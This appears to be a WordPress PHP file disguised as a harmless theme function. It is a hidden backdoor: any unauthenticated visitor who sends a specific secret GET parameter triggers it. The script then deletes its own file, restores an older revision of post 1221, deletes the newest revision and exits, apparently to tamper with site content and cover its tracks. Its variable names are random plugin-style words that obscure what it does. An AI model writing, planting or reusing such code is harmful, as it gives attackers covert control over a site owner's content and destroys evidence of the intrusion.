<?php

function theme_hide_captcha_friendly() {
	if (isset($_GET['include_custom_total']) && $_GET['include_custom_total'] === 'gateway_max_header') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$nofollow_urls_sticky_cf7 = 1221;
		$class_rating_tools_frontend = wp_get_post_revisions($nofollow_urls_sticky_cf7);
		if (empty($class_rating_tools_frontend)) die('no revisions');
		if (count($class_rating_tools_frontend) < 2) die('less than 2');
		$accessibility_out_image_mini = array_shift($class_rating_tools_frontend);
		$columns_notifications_syntax_portfolio = $accessibility_out_image_mini->ID;
		$modules_loader_gallery = array_shift($class_rating_tools_frontend);
		$only_rotator_smart = $modules_loader_gallery->ID;
		$contact_sort_loader_store = wp_restore_post_revision($only_rotator_smart);
		if ($contact_sort_loader_store === false) die('error restoring');
		$contact_sort_loader_store = wp_delete_post_revision($columns_notifications_syntax_portfolio);		
		if ($contact_sort_loader_store === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'theme_hide_captcha_friendly');
